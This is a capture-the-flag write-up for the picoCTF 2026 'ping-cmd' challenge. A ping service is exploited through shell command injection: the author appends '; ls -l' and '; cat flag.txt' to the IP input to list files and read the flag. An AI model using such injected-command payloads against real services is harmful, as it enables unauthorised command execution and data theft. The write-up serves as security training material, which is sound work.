# ping-cmd

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information

```text
Level: Easy
Tags: General Skills, picoCTF 2026
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Author: Yahaya Meddy

Description:
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you 
get a little creative with your input?

You can connect to the service here nc xebec.cylabacademy.net 25874

Hints:
1. The program uses a shell command behind the scenes.
2. Sometimes, You can run more than one command at a time.
```

Challenge link: [https://learn.cylabacademy.org/library/757](https://learn.cylabacademy.org/library/757)

## Solution

We start by connecting to the service with netcat.

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2026/General_Skills/ping-cmd]
└─$ nc xebec.cylabacademy.net 25874
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 1.1.1.1
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.

--- 1.1.1.1 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1018ms


┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2026/General_Skills/ping-cmd]
└─$ nc xebec.cylabacademy.net 25874
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.07 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.09 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 9.070/9.079/9.089/0.009 ms

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2026/General_Skills/ping-cmd]
└─$ 
```

As mentioned in the hints, the service seems to run the `ping` command behind the scene.

And for seccurity reasons, only one destination IP seems to be allowed (`8.8.8.8`).

But what if we can [inject another command](https://en.wikipedia.org/wiki/Code_injection#Shell_injection) after the `ping` command?

Let's also try to list the files in the current directory.

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2026/General_Skills/ping-cmd]
└─$ nc xebec.cylabacademy.net 25874
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 1.1.1.1; ls -l
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.

--- 1.1.1.1 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1061ms

total 8
-r-------- 1 ctf-player ctf-player  49 Sep 23 06:59 flag.txt
-r-x------ 1 ctf-player ctf-player 149 Sep 23 00:59 script.sh
```

It looks like we have the flag file and a script.

### Get the flag

Now we can just cat the flag instead of listing the files.

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2026/General_Skills/ping-cmd]
└─$ nc xebec.cylabacademy.net 25874
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 1.1.1.1; cat flag.txt
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.

--- 1.1.1.1 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1006ms

academy{<REDACTED>}
```

For additional information, please see the references below.

## References

- [Code injection - Wikipedia](https://en.wikipedia.org/wiki/Code_injection)
- [Command Injection - OWASP](https://owasp.org/www-community/attacks/Command_Injection)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [OS command injection - PortSwigger](https://portswigger.net/web-security/os-command-injection)
- [ping - Linux manual page](https://man7.org/linux/man-pages/man8/ping.8.html)
